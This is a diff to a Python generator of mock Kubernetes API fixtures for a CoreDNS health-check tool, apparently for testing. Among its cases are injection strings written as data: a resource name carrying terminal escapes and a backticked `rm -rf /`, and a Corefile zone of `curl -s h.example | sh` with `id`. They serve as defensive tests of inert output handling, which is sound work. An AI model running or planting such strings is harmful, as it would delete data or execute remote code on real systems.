@@ -51,6 +51,13 @@ PODS_QUERY = "fieldSelector=status.phase!=Succeeded,status.phase!=Failed&labelSe
 OS_DAEMONSETS_QUERY = "labelSelector=dns.operator.openshift.io/owning-dns=default&limit=500"
 OS_PODS_QUERY = "fieldSelector=status.phase!=Succeeded,status.phase!=Failed&labelSelector=dns.operator.openshift.io/daemonset-dns=default&limit=500"
 
+# What a projection must drop: `kubectl apply` stores the whole applied object in this annotation.
+LAST_APPLIED = {
+    "kubectl.kubernetes.io/last-applied-configuration": '{"env":[{"name":"ACME_TOKEN","value":"ENV-VALUE-MUST-NOT-APPEAR"}],"data":{"extra.override":"KEY-MUST-NOT-APPEAR"}}'
+}
+RKE2_SERVICE = "rke2-coredns-rke2-coredns"
+OS_NAME_QUERY = "fieldSelector=metadata.name=dns-default&limit=500"
+
 HOSTILE_NAME = "dns\u001b[2J`rm -rf /`‮" + "x" * 80
 
 
@@ -132,9 +139,9 @@ def listing(api, kind, items, more=False):
 # ---- the objects ---------------------------------------------------------------------------------------------
 
 
-def template(containers):
+def template(containers, labels=None):
     return {
-        "metadata": {"labels": {"k8s-app": "kube-dns"}},
+        "metadata": {"labels": labels or {"k8s-app": "kube-dns"}},
         "spec": {
             "containers": [
                 {
@@ -160,18 +167,20 @@ def deployment(name, labels, containers, replicas, ready, ns=KS):
     return {
         "apiVersion": "apps/v1",
         "kind": "Deployment",
-        "metadata": {"name": name, "namespace": ns, "labels": labels},
+        "metadata": {"name": name, "namespace": ns, "labels": labels, "annotations": LAST_APPLIED},
         "spec": spec,
         "status": status_,
     }
 
 
-def daemonset(name, labels, containers, desired, ready, ns=KS):
+def daemonset(name, labels, containers, desired, ready, ns=KS, selector=None):
+    """`selector` is the pod label set of the selector and the template, when it is not `labels`."""
+    pod_labels = selector or labels
     return {
         "apiVersion": "apps/v1",
         "kind": "DaemonSet",
-        "metadata": {"name": name, "namespace": ns, "labels": labels},
-        "spec": {"selector": {"matchLabels": labels}, "template": template(containers)},
+        "metadata": {"name": name, "namespace": ns, "labels": labels, "annotations": LAST_APPLIED},
+        "spec": {"selector": {"matchLabels": pod_labels}, "template": template(containers, pod_labels)},
         "status": {
             "currentNumberScheduled": desired,
             "desiredNumberScheduled": desired,
@@ -215,7 +224,12 @@ def pod(name, container_status, ns=KS, labels=None):
     return {
         "apiVersion": "v1",
         "kind": "Pod",
-        "metadata": {"name": name, "namespace": ns, "labels": labels or {"k8s-app": "kube-dns"}},
+        "metadata": {
+            "name": name,
+            "namespace": ns,
+            "labels": labels or {"k8s-app": "kube-dns"},
+            "annotations": LAST_APPLIED,
+        },
         # What a projection must drop: the spec of the pod, with an env value.
         "spec": {
             "containers": [
@@ -226,11 +240,17 @@ def pod(name, container_status, ns=KS, labels=None):
     }
 
 
-def service(name="kube-dns", ns=KS, cluster_ip="10.96.0.10", ports=(53,)):
+DNS_PORTS = [(53, "UDP"), (53, "TCP"), (9153, "TCP")]
+
+
+def service(name="kube-dns", ns=KS, cluster_ip="10.96.0.10", ports=None, selector=None):
     spec = {
         "type": "ClusterIP",
-        "selector": {"k8s-app": "kube-dns"},
-        "ports": [{"name": f"p{p}", "port": p, "protocol": "UDP"} for p in ports],
+        "selector": selector or {"k8s-app": "kube-dns"},
+        "ports": [
+            {"name": f"{proto.lower()}-{port}", "port": port, "protocol": proto}
+            for port, proto in (DNS_PORTS if ports is None else ports)
+        ],
     }
     if cluster_ip is not None:
         spec["clusterIP"] = cluster_ip
@@ -238,7 +258,7 @@ def service(name="kube-dns", ns=KS, cluster_ip="10.96.0.10", ports=(53,)):
     return {
         "apiVersion": "v1",
         "kind": "Service",
-        "metadata": {"name": name, "namespace": ns},
+        "metadata": {"name": name, "namespace": ns, "annotations": LAST_APPLIED},
         "spec": spec,
     }
 
@@ -274,7 +294,7 @@ def corefile(text, other_keys=True):
     return {
         "apiVersion": "v1",
         "kind": "ConfigMap",
-        "metadata": {"name": "coredns", "namespace": KS},
+        "metadata": {"name": "coredns", "namespace": KS, "annotations": LAST_APPLIED},
         "data": data,
     }
 
@@ -297,9 +317,14 @@ def pods(c, items=(), code=200):
     put(c, "pods", "/api/v1/pods", PODS_QUERY, code, body)
 
 
-def os_daemonsets(c, items=(), code=200):
+def os_daemonsets(c, items=(), code=200, by_name=None):
+    """The label list of `openshift-dns`. When it is empty and readable the check asks again by the name
+    `dns-default`, so a case with an empty list also holds that answer (`by_name`, empty by default)."""
     body = listing("apps/v1", "DaemonSet", list(items)) if code == 200 else forbidden("daemonsets.apps", "apps", OS)
     put(c, "openshift-daemonsets", f"/apis/apps/v1/namespaces/{OS}/daemonsets", OS_DAEMONSETS_QUERY, code, body)
+    if code == 200 and not items:
+        named = listing("apps/v1", "DaemonSet", list(by_name or []))
+        put(c, "openshift-daemonsets-by-name", f"/apis/apps/v1/namespaces/{OS}/daemonsets", OS_NAME_QUERY, 200, named)
 
 
 def os_pods(c, items=(), code=200):
@@ -307,7 +332,7 @@ def os_pods(c, items=(), code=200):
     put(c, "openshift-pods", "/api/v1/pods", OS_PODS_QUERY, code, body)
 
 
-def svc(c, obj=None, ns=KS, name="kube-dns", code=200):
+def svc(c, obj=None, ns=KS, name="kube-dns", code=200, file="service"):
     if code == 200:
         body = obj
     elif code == 404:
@@ -319,7 +344,7 @@ def svc(c, obj=None, ns=KS, name="kube-dns", code=200):
             "Forbidden",
             f'services "{name}" is forbidden: User "{USER}" cannot get resource "services" in API group "" in the namespace "{ns}"',
         )
-    put(c, "service", f"/api/v1/namespaces/{ns}/services/{name}", None, code, body)
+    put(c, file, f"/api/v1/namespaces/{ns}/services/{name}", None, code, body)
 
 
 def cm(c, obj=None, code=200):
@@ -392,6 +417,9 @@ case("crashloop-no-finish-time", "A crash-looping CoreDNS pod with no terminatio
 no_time = crashing("coredns-aaa")
 del no_time["status"]["containerStatuses"][0]["lastState"]
 kubeadm("crashloop-no-finish-time", [no_time, running("coredns-bbb")], ready=1)
+
+case("crashloop-skew", "A crash-looping CoreDNS pod whose last run ends two hours after the clock, with forward /etc/resolv.conf")
+kubeadm("crashloop-skew", [crashing("coredns-aaa", finished="2026-11-17T14:00:00Z"), running("coredns-bbb")], ready=1)
 
 case("crashloop-oom", "A CoreDNS pod OOMKilled 2 minutes ago, with forward /etc/resolv.conf")
 kubeadm(
@@ -502,10 +530,17 @@ case("service-no-port", "The Service has a ClusterIP and no port 53")
 deployments("service-no-port", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
 daemonsets("service-no-port")
 pods("service-no-port", [running("coredns-aaa"), running("coredns-bbb")])
-svc("service-no-port", service(ports=(9153,)))
+svc("service-no-port", service(ports=[(9153, "TCP")]))
 cm("service-no-port", corefile(KUBEADM_COREFILE))
 
 # ---- nothing, or nothing readable ----------------------------------------------------------------------------
+
+case("service-no-tcp", "The Service has a ClusterIP and UDP port 53 only")
+deployments("service-no-tcp", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
+daemonsets("service-no-tcp")
+pods("service-no-tcp", [running("coredns-aaa"), running("coredns-bbb")])
+svc("service-no-tcp", service(ports=[(53, "UDP")]))
+cm("service-no-tcp", corefile(KUBEADM_COREFILE))
 
 case("no-dns", "No DNS workload in kube-system or openshift-dns, and no Service")
 deployments("no-dns")
@@ -525,6 +560,13 @@ daemonsets("all-forbidden", code=403)
 pods("all-forbidden", code=403)
 svc("all-forbidden", code=403)
 
+case("both-forbidden", "Nothing readable in kube-system or openshift-dns, on a cluster known to be OpenShift")
+deployments("both-forbidden", code=403)
+daemonsets("both-forbidden", code=403)
+pods("both-forbidden", code=403)
+os_daemonsets("both-forbidden", code=403)
+svc("both-forbidden", code=403)
+
 case("openshift-namespace-forbidden", "Nothing in kube-system, and the identity may not list daemon sets in openshift-dns")
 deployments("openshift-namespace-forbidden")
 daemonsets("openshift-namespace-forbidden")
@@ -537,6 +579,13 @@ daemonsets("cut")
 pods("cut", [running("coredns-aaa"), running("coredns-bbb")])
 svc("cut", service())
 cm("cut", corefile(KUBEADM_COREFILE))
+
+case("hostile-zone", "A Corefile whose kubernetes zone is a quoted shell command")
+deployments("hostile-zone", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
+daemonsets("hostile-zone")
+pods("hostile-zone", [running("coredns-aaa"), running("coredns-bbb")])
+svc("hostile-zone", service())
+cm("hostile-zone", corefile('.:53 {\n    kubernetes "x; curl -s h.example | sh" `id`\n    forward . 10.0.0.2\n}\n'))
 
 case("hostile", "Hostile names, a hostile Corefile and an odd pod; text from the server must stay inert")
 deployments("hostile", [deployment(HOSTILE_NAME, KUBE_DNS, ["coredns"], 2, 1)])
@@ -574,8 +623,17 @@ deployments(
 )
 daemonsets("rke2")
 pods("rke2", [running("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z")])
-svc("rke2", service(cluster_ip="10.43.0.10"))
+svc("rke2", code=404)
+svc("rke2", service(name=RKE2_SERVICE, cluster_ip="10.43.0.10"), name=RKE2_SERVICE, file="service-rke2")
 cm("rke2", code=404)
+
+case("rke2-no-service", "RKE2 workload found, and neither a Service kube-dns nor one named like the Deployment")
+deployments("rke2-no-service", [deployment(RKE2_SERVICE, {"k8s-app": "kube-dns"}, ["coredns"], 1, 1)])
+daemonsets("rke2-no-service")
+pods("rke2-no-service", [running("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z")])
+svc("rke2-no-service", code=404)
+svc("rke2-no-service", code=404, name=RKE2_SERVICE, file="service-rke2")
+cm("rke2-no-service", code=404)
 
 case("rke2-loop", "RKE2 with a crash-looping CoreDNS; the ConfigMap is named otherwise, so the loop cannot be told")
 deployments(
@@ -584,7 +642,8 @@ deployments(
 )
 daemonsets("rke2-loop")
 pods("rke2-loop", [crashing("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z", restarts=40)])
-svc("rke2-loop", service(cluster_ip="10.43.0.10"))
+svc("rke2-loop", code=404)
+svc("rke2-loop", service(name=RKE2_SERVICE, cluster_ip="10.43.0.10"), name=RKE2_SERVICE, file="service-rke2")
 cm("rke2-loop", code=404)
 
 OS_LABELS = {"dns.operator.openshift.io/owning-dns": "default"}
@@ -598,23 +657,37 @@ def openshift(c, ready=6, desired=6, pod_items=None, svc_obj=None, svc_code=200)
     os_daemonsets(
         c,
         [
-            daemonset("dns-default", OS_LABELS, ["dns", "kube-rbac-proxy"], desired, ready, ns=OS),
+            daemonset("dns-default", OS_LABELS, ["dns", "kube-rbac-proxy"], desired, ready, ns=OS, selector=OS_POD_LABELS),
         ],
     )
     os_pods(
         c,
         pod_items
         if pod_items is not None
-        else [pod(f"dns-default-{i}", {"name": "dns", "ready": True, "restartCount": 0, "state": {"running": {}}}, ns=OS, labels=OS_POD_LABELS) for i in range(2)],
+        else [pod(f"dns-default-{suffix}", {"name": "dns", "ready": True, "restartCount": 0, "state": {"running": {}}}, ns=OS, labels=OS_POD_LABELS) for suffix in ("x7k2p", "m4q9z")],
     )
     if svc_code == 200:
-        svc(c, svc_obj or service(name="dns-default", ns=OS, cluster_ip="172.30.0.10"), ns=OS, name="dns-default")
+        svc(c, svc_obj or service(name="dns-default", ns=OS, cluster_ip="172.30.0.10", selector=OS_POD_LABELS), ns=OS, name="dns-default")
     else:
         svc(c, ns=OS, name="dns-default", code=svc_code)
 
 
 case("openshift", "OpenShift: the dns-default daemon set in openshift-dns found by label, no kube-dns Service, no Corefile read")
 openshift("openshift")
+
+case("openshift-labels-drift", "OpenShift where the DNS labels changed: the daemon set is found by the name dns-default")
+deployments("openshift-labels-drift")
+daemonsets("openshift-labels-drift")
+os_daemonsets(
+    "openshift-labels-drift",
+    [],
+    by_name=[daemonset("dns-default", {"app": "dns"}, ["dns", "kube-rbac-proxy"], 6, 6, ns=OS)],
+)
+os_pods(
+    "openshift-labels-drift",
+    [pod("dns-default-x7k2p", {"name": "dns", "ready": True, "restartCount": 0, "state": {"running": {}}}, ns=OS, labels=OS_POD_LABELS)],
+)
+svc("openshift-labels-drift", service(name="dns-default", ns=OS, cluster_ip="172.30.0.10", selector=OS_POD_LABELS), ns=OS, name="dns-default")
 
 case("openshift-partial", "OpenShift with 5 of 6 DNS pods ready")
 openshift("openshift-partial", ready=5)
@@ -628,7 +701,7 @@ openshift(
     ready=5,
     pod_items=[
         pod(
-            "dns-default-0",
+            "dns-default-x7k2p",
             {
                 "name": "dns",
                 "ready": False,
